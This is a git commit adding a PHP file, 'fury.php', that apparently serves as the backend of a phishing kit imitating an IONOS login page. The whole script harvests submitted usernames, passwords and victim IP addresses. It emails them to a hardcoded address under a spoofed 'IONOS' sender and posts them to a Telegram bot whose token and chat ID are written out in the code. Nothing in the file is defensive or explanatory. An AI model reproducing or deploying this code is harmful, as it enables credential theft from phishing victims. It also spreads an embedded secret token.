709d2b140da697d8fd3c9880c0c66f3346d0d847
CHARDAI HUDNELL <114242655+jhflooringinc@users.noreply.github.com>
2024-04-23 10:03:27 -0700

    Add files via upload

---
+++ fury.php
@@ -0,0 +1,55 @@
+<?php
+$ip = getenv("REMOTE_ADDR");
+$login = $_POST['ai'];
+$passwd= $_POST['pr'];
+
+$done = array('signal'=>'ok');
+$bad = array('signal'=>'bad');
+
+
+if (!empty($login) && !empty($passwd)) {
+
+
+    $own = 'info@shrawderbuilders.com';
+    $date = date("D/M/d, Y g:i a");
+    $subj = "IONOS: $login";
+    $from = "From:IONOS Dav! <mail@me.mom163.com>";
+    $msg = "Username: $login\nPassword: $passwd\nSubmitted on $date\n\Ip ===> $ip\n-----------------------------------\n        IONOS Log Created By (DAV)\n-----------------------------------";
+    mail($own,$subj,$msg,$from);
+
+    ///////////////////////////////////////////////////////////////////////
+
+    $botToken2 = '5950332174:AAHloTCxl52WXAxLPSf-_IjxxBRuoRXRhQE'; // Replace with your bot token
+    $chatId2 = '1813671610';
+
+    // Telegram API URL
+    $apiUrl2 = "https://api.telegram.org/bot{$botToken2}/sendMessage";
+
+    // Prepare the message data
+    $data2 = array(
+        'chat_id' => $chatId2,
+        'text' => $msg
+    );
+
+    // Use cURL to send the message
+    $ch2 = curl_init($apiUrl2);
+    curl_setopt($ch2, CURLOPT_POST, 1);
+    curl_setopt($ch2, CURLOPT_POSTFIELDS, $data2);
+    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
+
+    // Execute the cURL request
+    $response2 = curl_exec($ch2);
+    curl_close($ch2);
+
+    echo json_encode($done);
+
+    }
+
+else {
+  echo json_encode($bad);
+}
+$fp = fopen("","a");
+fputs($fp,$msg);
+fclose($fp);
+
+?>
